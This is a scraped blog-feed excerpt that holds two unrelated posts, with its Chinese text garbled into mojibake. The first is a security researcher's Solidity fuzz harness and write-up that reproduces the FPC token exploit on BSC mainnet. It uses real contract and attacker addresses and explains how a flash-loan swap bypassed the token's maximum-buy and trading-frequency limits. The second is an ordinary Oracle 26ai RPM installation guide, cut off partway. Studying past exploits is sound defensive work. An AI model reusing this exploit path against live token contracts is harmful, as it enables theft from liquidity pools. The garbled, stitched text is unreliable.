SPDX-License-Identifier: MIT\npragma solidity ^0.8.22;\n\nimport {console} from \"forge-std/console.sol\";\n\n/// @notice Minimal interfaces used by this harness (avoid importing full ABIs).\ninterface IPancakeV3PoolLike {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n}\n\ninterface IStdCheats {\n    function prank(address) external;\n    function startPrank(address) external;\n    function stopPrank() external;\n}\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);\n}\n\n/// @notice Minimal pool interface needed by the harness.\ninterface IPancakeV3Pool {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n    function mint(address recipient, uint256 amount0, uint256 amount1) external;\n    function burn(address to, uint256 amount0, uint256 amount1) external;\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;\n    function sync() external;\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n}\n\n/// @title Onchain exploit detector (Medusa/Property-based fuzz harness)\n/// @notice Stateful harness that flags a post-repay positive USDT remainder.\n/// @dev Medusa convention:\n/// - `fuzz_*` functions are used as actions in generated call sequences\n/// - `property_*` functions are checked as invariants/properties\ncontract OnchainExploitDetector {\n    // ----------------------------\n    // Addresses / dependencies (BSC mainnet)\n    // ----------------------------\n    IStdCheats cheats = IStdCheats(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;\n    address public constant FPC = 0xB192D4A737430AA61CEA4Ce9bFb6432f7D42592F;\n\n    /// @notice Pancake V3 pool used as flash source (USDT/USDC).\n    address public constant FLASH_POOL_ADDR = 0x92b7807bF19b7DDdf89b706143896d05228f3121;\n    address public constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n    address public constant POOL = 0xa1e08E10Eb09857A8C6F2Ef6CCA297c1a081eD6B;\n\n    /// @notice Attacker EOA (as observed on-chain).\n    address public constant HACKER = 0xC2a81942627f6929521397eef6173F271D1fB456;\n\n    // ----------------------------\n    // Fuzz state\n    // ----------------------------\n    uint256 private startUsdtBalance;\n    bool private usdtNotIncreased;\n\n    /// @dev Pre-approve router spending for this harness address to reduce fuzz noise.\n    constructor() {\n        IERC20(USDT).approve(ROUTER, type(uint256).max);\n        IERC20(FPC).approve(ROUTER, type(uint256).max);\n    }\n\n    /// @notice Fuzz action: take a flashloan and execute the swap path via callback.\n    /// @param flashloanAmount Flash amount chosen by the fuzzer (USDT).\n    function fuzz_swap(uint256 flashloanAmount) external {\n        startUsdtBalance = IERC20(USDT).balanceOf(HACKER);\n        // 1. Flashloan USDT from Pancake V3 Pool\n\n        bytes memory data = abi.encode(flashloanAmount);\n        IPancakeV3PoolLike(FLASH_POOL_ADDR).flash(address(this), flashloanAmount, 0, data);\n    }\n\n    /// @notice Pancake V3 flash callback.\n    /// @dev Guarded by `msg.sender` to avoid arbitrary external driving of the sequence.\n    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        if (msg.sender != FLASH_POOL_ADDR) return;\n        // 2. Buy FPC with USDT balance\n        uint256 usdtAmount = IERC20(USDT).balanceOf(address(this));\n\n        // Quote expected out amount for the buy, then swap against the target pool\n        address[] memory path0 = new address[](2);\n        path0[0] = USDT;\n        path0[1] = FPC;\n        uint256 buyAmount = usdtAmount - 1e18;\n        uint256[] memory amounts = IUniswapV2Router02(ROUTER).getAmountsOut(buyAmount, path0);\n        uint256 fpcAmount = amounts[1];\n\n        IPancakeV3Pool(POOL).swap(1e18, fpcAmount, address(this), \"0x00\");\n\n        // 3. Transfer FPC to Hacker\n        IERC20(FPC).transfer(HACKER, IERC20(FPC).balanceOf(address(this)));\n\n        // 4. Sell FPC back to USDT (as hacker)\n        uint256 sellAmount = IERC20(FPC).balanceOf(HACKER);\n        address[] memory path1 = new address[](2);\n        path1[0] = FPC;\n        path1[1] = USDT;\n\n        cheats.startPrank(HACKER);\n        IERC20(FPC).approve(ROUTER, type(uint256).max);\n        IUniswapV2Router02(ROUTER)\n            .swapExactTokensForTokensSupportingFeeOnTransferTokens(sellAmount, 0, path1, address(this), block.timestamp);\n        cheats.stopPrank();\n\n        // 5. Repay Flashloan\n        uint256 flashloanAmount = abi.decode(data, (uint256));\n        uint256 repayAmount = flashloanAmount + fee0;\n        uint256 currentBalance = IERC20(USDT).balanceOf(address(this));\n\n        // If we cannot repay, the flashloan will revert at the pool level.\n        if (currentBalance &lt; repayAmount) {\n            return;\n        }\n\n        IERC20(USDT).transfer(FLASH_POOL_ADDR, repayAmount);\n\n        // If any USDT remains after repayment, flag it for the property to catch.\n        uint256 remainingBalance = IERC20(USDT).balanceOf(address(this));\n        if (remainingBalance &gt; 0) {\n            usdtNotIncreased = true;\n        }\n    }\n\n    /// @notice Pancake V2-style callback.\n    /// @dev Guarded by `msg.sender` to avoid arbitrary external driving of the sequence.\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        if (msg.sender != POOL) return;\n        uint256 usdtAmount = IERC20(USDT).balanceOf(address(this));\n        IERC20(USDT).transfer(POOL, usdtAmount);\n    }\n\n    /// @notice Medusa property: must never observe a post-repay positive USDT remainder.\n    /// @dev If `usdtNotIncreased` flips true, we intentionally fail to surface the counterexample.\n    function property_user_usdt_not_increased() external view returns (bool) {\n        if (usdtNotIncreased) assert(false); // alert\n        return true;\n    }\n}\n</code></pre>\n<p>æ‰§è¡Œ <code>medusa fuzz --config medusa.onchain.json</code> å‘½ä»¤å¼€å§‹æ‰§è¡Œ<br />\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1483609/202601/1483609-20260130234551288-1061933284.png\" /></p>\n<p>è¿™è¡Œæ˜¯ Medusa fuzz è¿è¡Œæ—¶çš„å®æ—¶ç»Ÿè®¡ï¼Œå„å­—æ®µå«ä¹‰å¦‚ä¸‹ï¼ˆä»¥ä¸‹é¢è¿™æ¡ä¸ºä¾‹ï¼‰ï¼š</p>\n<blockquote>\n<p>fuzz: elapsed: 2m12s, calls: 336480 (2531/sec), seq/s: 50, branches hit: 1115, corpus: 3, failures: 0/6725, gas/s: 2422662009</p>\n</blockquote>\n<ul>\n<li><code>elapsed: 2m12s</code>ï¼šå·²è¿è¡Œæ—¶é—´ã€‚</li>\n<li><code>calls: 336480 (2531/sec)</code>ï¼šç´¯è®¡æ‰§è¡Œäº† 336,480 æ¬¡â€œåˆçº¦è°ƒç”¨â€ï¼ˆå•æ¬¡ fuzz é‡Œå¯¹æŸä¸ªå‡½æ•°çš„ä¸€æ¬¡è°ƒç”¨ï¼‰ï¼Œæ‹¬å·é‡Œæ˜¯å¹³å‡æ¯ç§’ calls æ•°ã€‚</li>\n<li><code>seq/s: 50</code>ï¼šæ¯ç§’ç”Ÿæˆ/æ‰§è¡Œçš„â€œè°ƒç”¨åºåˆ—â€ï¼ˆcall sequenceï¼‰æ•°é‡ã€‚ä¸€ä¸ªåºåˆ—é‡Œä¼šåŒ…å«å¤šæ¬¡ callsï¼ˆç”± callSequenceLength ç­‰é…ç½®å½±å“ï¼‰ã€‚</li>\n<li><code>branches hit: 1115</code>ï¼šå½“å‰è¦†ç›–åˆ°çš„åˆ†æ”¯æ•°é‡ï¼ˆcoverage çš„ä¸€ä¸ªæŒ‡æ ‡ï¼›è¶Šé«˜è¯´æ˜æ¢ç´¢åˆ°çš„è·¯å¾„è¶Šå¤šï¼‰ã€‚</li>\n<li><code>corpus: 3</code>ï¼šå½“å‰ä¿å­˜çš„â€œæœ‰æ•ˆè¾“å…¥æ ·æœ¬â€æ•°é‡ï¼ˆèƒ½å¸¦æ¥æ–°è¦†ç›–æˆ–æ›´ä¼˜è·¯å¾„çš„ seed/åºåˆ—ä¼šè¿›å…¥ corpusï¼Œä¾›åç»­å˜å¼‚ï¼‰ã€‚</li>\n<li><code>failures: 0/6725</code>ï¼šå¤±è´¥æ•°é‡/å¤±è´¥æ€»æ¬¡æ•°ã€‚ä½ è¿™é‡Œè¡¨ç¤º 0 ä¸ªâ€œå¯¼è‡´æµ‹è¯•å¤±è´¥çš„ç”¨ä¾‹â€ï¼Œä½†æœŸé—´ä¸€å…±å‘ç”Ÿè¿‡ 6725 æ¬¡éè‡´å‘½å¤±è´¥/å›é€€ï¼ˆrevert/invalidï¼‰ è¢«è®°å½•ï¼ˆé€šå¸¸ä¸ç®— test failureï¼Œé™¤éè§¦å‘äº†æ–­è¨€å¤±è´¥æˆ–é…ç½®ä¸ºå¤±è´¥å³åœï¼‰ã€‚</li>\n<li><code>gas/s: 2422662009</code>ï¼šæ¯ç§’æ¶ˆè€—çš„ gas æ€»é‡ï¼ˆååé‡æŒ‡æ ‡ï¼›è¶Šé«˜é€šå¸¸è¡¨ç¤ºæ‰§è¡Œæ›´â€œé‡â€æˆ–æ›´å¿«ï¼‰ã€‚</li>\n</ul>\n<p>å½“ fuzz å‡ºå‘äº† property çš„å‘Šè­¦æ¡ä»¶åï¼Œä¼šæ˜¾ç¤ºç›¸å…³çš„å†…å®¹ï¼ŒåŒ…æ‹¬ fuzz traceï¼Œproperty traceï¼Œreportã€‚</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1483609/202601/1483609-20260130234958182-1914923454.png\" /></p>\n<ul>\n<li>fuzz traceï¼šèƒ½å¤Ÿè§¦å‘å‘Šè­¦çš„ Call trace</li>\n<li>property traceï¼šè§¦å‘çš„ç›¸å…³å‘Šè­¦</li>\n<li>reportï¼šfuzz æƒ…å†µçš„æŠ¥å‘Šï¼ŒåŒ…æ‹¬è¦†ç›–ç‡ï¼ˆdebug çš„æ—¶å€™ä¹Ÿç”¨å¾—ä¸Šï¼‰</li>\n</ul>\n<h2 id=\"fuzz-æŠ¥å‘Š\">Fuzz æŠ¥å‘Š</h2>\n<p>æ‰“å¼€ <code>crytic-export/coverage/coverage_report.html</code> æŸ¥çœ‹ Fuzz æŠ¥å‘Š<br />\nè¦†ç›–ç‡è¾¾åˆ°äº† 91.7 %ï¼Œç»¿è‰²éƒ¨åˆ†ä»£ç æ˜¯åœ¨ fuzz è¿‡ç¨‹ä¸­è¢«è°ƒç”¨åˆ°çš„ï¼Œçº¢è‰²åˆ™æ˜¯æ²¡æœ‰è¢«è°ƒç”¨ã€‚<br />\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1483609/202601/1483609-20260130235059363-377064041.png\" /></p>\n<h1 id=\"å¤ç›˜ä¸æ„Ÿæ‚Ÿ\">å¤ç›˜ä¸æ„Ÿæ‚Ÿ</h1>\n<blockquote>\n<p>Qï¼šä¸ºä»€ä¹ˆé‡‡ç”¨æ¨¡ä»¿ PoC çš„æ–¹å¼ç¼–å†™ fuzz å‡½æ•°ï¼Œè€Œä¸æ˜¯ä»¥æ›´é€šç”¨çš„æ–¹å¼ç¼–å†™ fuzz å‡½æ•°ï¼Ÿ<br />\nAï¼šä¸€å¼€å§‹æ˜¯ä»¥æ›´é€šç”¨çš„æ–¹å¼ç¼–å†™çš„ fuzz å‡½æ•°ï¼Œä½†æ˜¯ä¸€ç›´ fuzz ä¸å‡ºæ¥ç»“æœï¼Œè¦†ç›–ç‡ä¹Ÿæœ‰å¼‚å¸¸ã€‚</p>\n</blockquote>\n<p>å› ä¸ºä¸€å¼€å§‹æ˜¯ç›´æ¥å›´ç»•ç€ FPC Token æ”»å‡»äº‹ä»¶åˆ†ææ–‡æ¡£ä¸­çš„ rootcause â€œæµåŠ¨æ€§ç‡ƒçƒ§æœºåˆ¶â€æ¥ç¼–å†™ fuzz å‡½æ•°çš„ã€‚åœ¨é¡¹ç›®ç±»å‹æ˜ç¡®ï¼Œæ¼æ´å‘ç”Ÿæœºåˆ¶æ¸…æ¥šçš„æƒ…å†µä¸‹ï¼Œå†™å‡ºæ¥çš„ fuzz å‡½æ•°ä¾æ—§æ— æ³•å¾—åˆ°ç»“æœã€‚</p>\n<blockquote>\n<p>Worker = 8ï¼Œè·‘äº†ä¸¤ä¸ªå°æ—¶ï¼Œæœºå™¨å·²ç»å‘çƒ­å¾—çƒ«æ‰‹äº†ï¼Œæ²¡æœ‰ç»§ç»­è·‘ä¸‹å»äº†ã€‚å¤ç›˜åå‘ç°æˆ‘å½“æ—¶ fuzz å‡½æ•°çš„å†™æ³•æ˜¯æ°¸è¿œè·‘ä¸å‡ºç»“æœçš„......</p>\n</blockquote>\n<p>éšååªèƒ½å…ˆå¤ç° PoCï¼Œå†æ ¹æ® PoC æ¥å†™ fuzz å‡½æ•°ã€‚è€Œåœ¨å¤ç°çš„è¿‡ç¨‹ä¸­å‘ç°äº†æ¼æ´çš„æ›´å¤šç»†èŠ‚ï¼Œæ˜¯ç¬¬ä¸€éåˆ†æçš„æ—¶å€™æ²¡æœ‰ç•™æ„åˆ°çš„ã€‚</p>\n<p>ç”±äºè¿™ä¸ªä»£å¸é™¤äº†æœ‰æœ€å¤§è´­ä¹°é¢åº¦çš„é™åˆ¶ã€‚è¿˜æœ‰è´­ä¹°é¢‘ç‡çš„é™åˆ¶ï¼Œé»‘å®¢é€šè¿‡ä¸€äº›å¾ˆå·§å¦™çš„æ“ä½œç»•è¿‡äº†è¿™ä¸¤ä¸ªæœºåˆ¶ã€‚</p>\n<ol>\n<li>ç»•è¿‡æœ€å¤§è´­ä¹°é¢åº¦çš„é™åˆ¶ï¼šç›´æ¥é€šè¿‡ pool å¤§é‡è´­ä¹° FPC æ—¶åŒæ—¶æ¢å‡º 1 ä¸ª USDTï¼Œç›®çš„å°±ä¸ºäº†æ¬ºéª— _isLiquidity å‡½æ•°çš„æ£€æŸ¥ï¼Œä¼ªè£…æˆç§»é™¤æµåŠ¨æ€§çš„æ“ä½œï¼Œç»•è¿‡äº†æœ€å¤§è´­ä¹°é¢åº¦çš„é™åˆ¶ã€‚<pre><code>CALLCake-LP.swap(amount0Out=1,000,000,000,000,000,000, amount1Out=790,178,970,489,172,772,916,652)\n</code></pre>\n</li>\n<li>ç»•è¿‡è´­ä¹°é¢‘ç‡çš„é™åˆ¶ï¼šè´­ä¹°é¢‘ç‡é™åˆ¶äº†è·ç¦»ä¸Šæ¬¡ä¹°å–æ“ä½œä¸‰ä¸ªåŒºå—åæ‰å¯ä»¥å†æ¬¡ä¹°å–ï¼Œé»‘å®¢åœ¨è´­ä¹°åˆ°äº†å¤§é‡ FPC ä»£å¸åï¼Œå°†å…¶ transfer ç»™äº†å¦ä¸€ä¸ªåœ°å€è¿›è¡Œå–å‡ºï¼ˆåœ¨ trace æˆªå›¾çš„ 32 è¡Œï¼‰ï¼Œç»•å¼€äº†è¿™ä¸ªé™åˆ¶ã€‚</li>\n</ol>\n<blockquote>\n<p>æ‰€ä»¥åœ¨è€ƒè™‘é€šç”¨æ€§çš„å‰æä¸‹ç¼–å†™å¯ç”¨çš„ fuzz å‡½æ•°æ—¶ï¼Œéœ€è¦æ·±å…¥ç ”ç©¶ä»£ç ï¼Œäº†è§£é¡¹ç›®æ‰€æ¶‰åŠçš„æ‰€æœ‰æœºåˆ¶ã€‚</p>\n</blockquote>\n<p>éœ€è¦æŠŠåè®®è¿è¡Œè¿‡ç¨‹ä¸­æ‰€æœ‰æ¶‰åŠçš„å†…å®¹éƒ½è€ƒè™‘è¿›å»ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š</p>\n<ol>\n<li>åè®®æœ¬èº«çš„æ‰€æœ‰å‡½æ•°è°ƒç”¨</li>\n<li>åè®®ç›¸å…³çš„ç‰¹æƒåœ°å€</li>\n<li>ä¸åè®®ç›¸å…³çš„æ‰€æœ‰åˆçº¦ï¼Œä»–ä»¬çš„æ‰€æœ‰å‡½æ•°è°ƒç”¨ï¼ˆç”šè‡³ç›¸å…³åˆçº¦çš„ç›¸å…³åˆçº¦ï¼‰</li>\n<li>åŒºå—é“¾çš„çŠ¶æ€æ”¹å˜</li>\n</ol>\n<blockquote>\n<p>Qï¼šé‚£ä¹ˆæœ‰å“ªäº›åœºæ™¯é€‚åˆä½¿ç”¨ fuzz è¿›è¡Œæ¼æ´å‘æ˜å‘¢ï¼Ÿ</p>\n</blockquote>\n<p>æ ¹æ®å¯¹ Medusa çš„ä½¿ç”¨ä½“éªŒä¸ fuzz å‡½æ•°ç¼–å†™è¦æ±‚æ¥çœ‹ï¼Œfuzz å¯èƒ½æ›´é€‚ç”¨äºåº”ç”¨åœ¨æ•°å­¦è®¡ç®—æ–¹é¢ã€‚ç”¨æ¥è§£å†³â€œæˆ‘è§‰å¾—è¿™é‡Œå¯èƒ½æœ‰è¾¹ç¼˜åœºæ™¯çš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘æ²¡åŠæ³•ä¸¾å‡ºæ¥ä¸€ä¸ªä¾‹å­â€çš„å›°å¢ƒï¼Œæ¯”å¦‚è¯´æ”¶ç›Šæ›²çº¿ï¼ŒæµåŠ¨æ€§æ›²çº¿ï¼Œä»½é¢æ¯”ä¾‹ï¼Œå€Ÿè´·æ¯”ä¾‹ç­‰ã€‚<br />\nè¿™ä¸€ç‚¹åœ¨å®˜æ–¹æ–‡æ¡£ä¸­ä¹Ÿæœ‰æ‰€æåŠ<br />\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1483609/202601/1483609-20260131000300946-400530903.png\" /></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-31 00:04</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ACaiGarden\">ACai_sec</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">13</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "AIå¼€å‘è€…å¦‚ä½•æ— ç—›éƒ¨ç½²Oracle AI Database 26aiç¯å¢ƒ",
      "link": "https://www.cnblogs.com/jyzhao/p/19556062/ai-kai-fa-zhe-ru-he-wu-tong-bu-shuoracle-ai-databa",
      "published": "",
      "description": "<a name=\"top\"></a>\n    <h2><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jyzhao/p/19556062/ai-kai-fa-zhe-ru-he-wu-tong-bu-shuoracle-ai-databa\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-30 23:05\">\n    <span>AIå¼€å‘è€…å¦‚ä½•æ— ç—›éƒ¨ç½²Oracle AI Database 26aiç¯å¢ƒ</span>\n    \n\n</a>\n</h2>\n    <small>\n<span id=\"post-date\">2026-01-30 23:05</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jyzhao\">AlfredZhao</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">28</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</small>\n    <div class=\"entry\">\n        <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>Oracle AI Database 26aiå‘å¸ƒåï¼Œçœ‹åˆ°å¾ˆå¤šDBAå¼€å§‹å¿™ç¢Œèµ·æ¥ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯å»å®‰è£…å„ç§å¤æ‚é«˜å¯ç”¨ç¯å¢ƒã€‚</p>\n<p>26aiä½œä¸ºAIåŸç”Ÿçš„æ•°æ®åº•åº§ï¼Œè¢«å¸å¼•çš„ä¸æ­¢ä¼ ç»ŸDBAï¼Œå¾ˆå¤šAIå¼€å‘è€…ä¹Ÿæ—©å°±æƒ³è‡ªå·±è¯•è¯•å®ƒäº†ã€‚</p>\n<p>å¦‚æœåªæ˜¯ç”¨äºå¼€å‘æµ‹è¯•ï¼Œå…¶å®æ²¡å¿…è¦å»æ±‚DBAç»™è£…æ­£è§„çš„RAC+ADGç¯å¢ƒï¼Œè€Œå•æœºçš„è¯ï¼Œå…¶å®ä¹Ÿä¸å¿…è‡ªå·±æŠ˜è…¾åƒDBAé‚£æ ·å¤æ‚çš„å®‰è£…ï¼Œç›´æ¥é‡‡ç”¨rpmçš„æ–¹å¼å®‰è£…å°±è¶³å¤Ÿã€‚</p>\n<p><strong>å‰ææ¡ä»¶ï¼š</strong> ä½ è¦æœ‰ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œæˆ–è€…æ˜¯è‡ªå·±çš„è™šæ‹Ÿæœºï¼Œä¸Šé¢å®‰è£…å¥½äº†OEL8æˆ–ä»¥ä¸Šçš„æ“ä½œç³»ç»Ÿï¼Œé…ç½®å¥½DNFæºæ–¹ä¾¿å®‰è£…ä¾èµ–åŒ…ã€‚</p>\n<p>ç„¶åå°±è·Ÿéšç¬”è€…è¯•è¯•å¦‚ä½•å¿«é€Ÿå®‰è£…éƒ¨ç½²rpmåŒ…å½¢å¼çš„Oracle 26aiå§ã€‚</p>\n<h2 id=\"01--å‡†å¤‡é˜¶æ®µ\">01 | å‡†å¤‡é˜¶æ®µ</h2>\n<p>ä¸‹è½½Oracle RPMç›¸å…³ä»‹è´¨ï¼š</p>\n<ul>\n<li><a href=\"https://www.oracle.com/database/technologies/oracle26ai-linux-downloads.html\" rel=\"noopener nofollow\" target=\"_blank\">https://www.oracle.com/database/technologies/oracle26ai-linux-downloads.html</a></li>\n</ul>\n<p>æ ¹æ®ç¯å¢ƒé€‰æ‹©ä½ éœ€è¦ä¸‹è½½çš„ä»‹è´¨ï¼Œç¬”è€…è¿™é‡Œæ˜¯OEL8.10ï¼Œæ‰€ä»¥é€‰æ‹©OEL8æ‰€å¯¹åº”çš„ä¼ä¸šç‰ˆæ•°æ®åº“è½¯ä»¶çš„rpmä»¥åŠç›¸å…³ä¾èµ–åŒ…çš„rpmã€‚</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/635610/202601/635610-20260130230509231-1779229285.jpg\" /></p>\n<p>ä¸‹è½½å®Œæˆæ˜¯è¿™ä¸¤ä¸ªrpmåŒ…ï¼š</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/635610/202601/635610-20260130230508939-35914157.jpg\" /></p>\n<h2 id=\"02--å®‰è£…ä¾èµ–åŒ…\">02 | å®‰è£…ä¾èµ–åŒ…</h2>\n<p>ç›´æ¥ä½¿ç”¨rootç”¨æˆ·æˆ–è€…sudoæ“ä½œï¼Œdnfå®‰è£…preinstallè¿™ä¸ªrpmåŒ…ï¼Œä¼šå°†æ‰€æœ‰ä¾èµ–åŒ…å’Œä¸€äº›åŸºç¡€ç³»ç»Ÿå‚æ•°é…ç½®å…¨éƒ¨è‡ªåŠ¨åŒ–æå®šã€‚</p>\n<pre><code class=\"language-bash\">$ sudo dnf install oracle-ai-database-preinstall-26ai-1.0-1.el8.x86_64.rpm\n</code></pre>\n<h2 id=\"03--å®‰è£…æ•°æ®åº“è½¯ä»¶\">03 | å®‰è£…æ•°æ®åº“è½¯ä»¶</h2>\n<pre><code class=\"language-bash\">$ sudo dnf install oracle-ai-database-ee-26ai-1.0-1.el8.x86_64.rpm\n\n[SEVERE] The install cannot proceed because ORACLE_BASE directory (/opt/oracle)\nis not owned by \"oracle\" user. You must change the ownership of ORACLE_BASE\ndirectory to \"oracle\" user and retry the installation.\n\nerror: %prein(oracle-ai-database-ee-26ai-1.0-1.x86_64) scriptlet failed, exit status 1\n\nError in PREIN scriptlet in rpm package oracle-ai-database-ee-26ai\n  Verifying        : oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                            1/1 \n\nFailed:\n  oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                                                   \n\nError: Transaction failed\n</code></pre>\n<p>è¿™é‡Œå°±æ˜¯ä¸ªç›®å½•æƒé™çš„å°é—®é¢˜ï¼Œç›´æ¥è¿™æ ·ä¿®æ”¹ä¸‹ï¼Œç„¶åå†æ¬¡æ‰§è¡Œï¼š</p>\n<pre><code class=\"language-bash\">$ sudo chown oracle:oinstall /opt/oracle\n$ sudo dnf install oracle-ai-database-ee-26ai-1.0-1.el8.x86_64.rpm\nLast metadata expiration check: 2:44:36 ago on Wed 28 Jan 2026 07:06:04 AM GMT.\nDependencies resolved.\n============================================================================================================================================================================\n Package                                                Architecture                       Version                           Repository                                Size\n============================================================================================================================================================================\nInstalling:\n oracle-ai-database-ee-26ai                             x86_64                             1.0-1                             @commandline                             2.0 G\n\nTransaction Summary\n============================================================================================================================================================================\nInstall  1 Package\n\nTotal size: 2.0 G\nInstalled size: 5.7 G\nIs this ok [y/N]: y\nDownloading Packages:\nRunning transaction check\nTransaction check succeeded.\nRunning transaction test\nTransaction test succeeded.\nRunning transaction\n  Preparing        :                                                                                                                                                    1/1 \n  Running scriptlet: oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                            1/1 \n  Installing       : oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                            1/1 \n  Running scriptlet: oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                            1/1 \n[INFO] Executing post installation scripts...\n[INFO] Oracle home installed successfully and ready to be configured.\nTo configure a sample Oracle AI Database, optionally modify the parameters in '/etc/sysconfig/oracledb_ORCLCDB-26ai.conf' and then run following service configuration script as root: /etc/init.d/oracledb_ORCLCDB-26ai configure\n\n  Verifying        : oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                            1/1 \n\nInstalled:\n  oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                                                   \n\nComplete!\n</code></pre>\n<h2 id=\"04--é…ç½®æ•°æ®åº“å®ä¾‹\">04 | é…ç½®æ•°æ®åº“å®ä¾‹</h2>\n<p>æŒ‰ç…§ä¸Šä¸€æ­¥çš„æ—¥å¿—æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¿®æ”¹éƒ¨åˆ†å‚æ•°ï¼Œåœ¨è¿™ä¸ªé…ç½®æ–‡ä»¶ä¸­ï¼š<code>/etc/sysconfig/oracledb_ORCLCDB-26ai.conf</code></p>\n<p>æ²¡ç‰¹æ®Šéœ€æ±‚ä¹Ÿå¯ä»¥ä¸ä¿®æ”¹ï¼Œç›´æ¥å®‰è£…ï¼Œè¿˜æ˜¯ä½¿ç”¨rootç”¨æˆ·æˆ–è€…sudoæ“ä½œï¼š</p>\n<pre><code class=\"language-bash\">sudo /etc/init.d/oracledb_ORCLCDB-26ai configure\n</code></pre>\n<p>ç»“æœå¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-BASH\">$ sudo /etc/init.d/oracledb_ORCLCDB-26ai configure\n/opt/oracle/product/26ai/dbhome_1/bin/dbca -silent -createDatabase -gdbName ORCLCDB -templateName General_Purpose.dbc -characterSet AL32UTF8 -createAsContainerDatabase true -numberOfPDBs 1 -pdbName ORCLPDB1 -createListener LISTENER:1521 -datafileDestination /opt/oracle/oradata -sid ORCLCDB -autoGeneratePasswords\nConfiguring Oracle AI Database ORCLCDB.\nPrepare for db operation\n8% complete\nCopying database files\n31% complete\nCreating and starting Oracle instance\n32% complete\n36% complete\n39% complete\n42% complete\n46% complete\nCompleting Database Creation\n51% complete\n53% complete\n54% complete\nCreating Pluggable Databases\n58% complete\n77% complete\nExecuting Post Configuration Actions\n100% complete\nDatabase creation complete. For details check the logfiles at:\n /opt/oracle/cfgtoollogs/dbca/ORCLCDB.\nDatabase Information:\nGlobal Database Name:ORCLCDB\nSystem Identifier(SID):ORCLCDB\nLook at the log file \"/opt/oracle/cfgtoollogs/dbca/ORCLCDB/ORCLCDB.log\" for further details.\n\nDatabase configuration completed successfully. The passwords were auto generated, you must change them by connecting to the database using 'sqlplus / as sysdba' as the oracle user.\n</code></pre>\n<p>åˆ°è¿™é‡Œå…¶å®å°±å®‰è£…å®Œäº†ï¼Œå¯ä»¥çœ‹åˆ°å®ä¾‹éƒ½å¯åŠ¨æˆåŠŸäº†ï¼š</p>\n<pre><code class=\"language-bash\">$ ps -ef|grep pmon\noracle   3043187       1  0 09:54 ?        00:00:00 ora_pmon_ORCLCDB\n</code></pre>\n<p>Oracleç”¨æˆ·çš„ç¯å¢ƒå˜é‡ä¸ç¡®è®¤å…¨æ–°ç¯å¢ƒä¸‹æ˜¯ä¸æ˜¯ä¹Ÿä¼šè‡ªåŠ¨é…ç½®ï¼Œç¬”è€…è¿™é‡Œå› ä¸ºæœ‰å…¶ä»–DBç¯å¢ƒï¼Œæ‰€ä»¥å˜é‡æ²¡æœ‰è‡ªåŠ¨é…ç½®çš„ï¼Œæ‰‹å†™ä¸€ä¸ªä¸´æ—¶çš„ï¼Œå¦‚æœä½ çš„ä¹Ÿæ²¡æœ‰ï¼Œå°±ä¹Ÿå‚ç…§è¿™æ ·å†™ï¼š</p>\n<p>vi 26ai.env</p>\n<pre><code class=\"language-bash\">export ORACLE_SID=ORCLCDB\nexport ORACLE_BASE=/opt/oracle\nexport ORACLE_HOME=/opt/oracle/product/26ai/dbhome_1\nexport PATH=$ORACLE_HOME/bin:$PATH\n</code></pre>\n<p>ç„¶åæƒ³åˆ‡æ¢è¿™ä¸ª26aiç¯å¢ƒå°±sourceä¸€ä¸‹ï¼Œå¦‚æœä½ 